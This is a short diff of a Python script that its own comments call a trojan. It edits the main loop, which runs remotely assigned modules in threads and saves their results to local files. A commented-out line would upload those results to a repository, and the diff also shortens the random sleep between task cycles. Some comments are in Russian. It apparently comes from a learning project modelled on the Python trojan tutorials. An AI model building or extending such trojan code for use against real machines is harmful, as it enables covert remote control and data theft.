@@ -32,7 +32,7 @@ def store_module_result(module, data):
     moduleDir = ".//data//%s" % module
     os.makedirs(moduleDir, exist_ok=True)
     #remote_path = ".//data//%s//%d.data" % (trojan_id,random.randint(1000,100000))
-    remote_path = ".//data//%s//%d.data" % (module , random.randint(1000,100000))
+    remote_path = ".//data//%s//%d.txt" % (module , random.randint(1000,100000))
     f = open(remote_path, 'w')
     f.write(data)
     #repo.create_file(remote_path,"Commit message",base64.b64encode(data))
@@ -46,8 +46,10 @@ def module_runner(module):
     store_module_result(module, result)
     print("[-]stop " + module)
     return
-
-
+#один запуск
+#постоянная работа
+#периодический
+    
 # main trojan loop
 
 while True:
@@ -58,5 +60,6 @@ while True:
             t = threading.Thread(target=module_runner,args=(task['module'],))
             t.start()
             time.sleep(random.randint(1,10))
-    print("спать!!")
-    time.sleep(random.randint(1000,10000))
+    sleepOnSec = random.randint(10,100)
+    print("спать на " + str(sleepOnSec))
+    time.sleep(sleepOnSec)
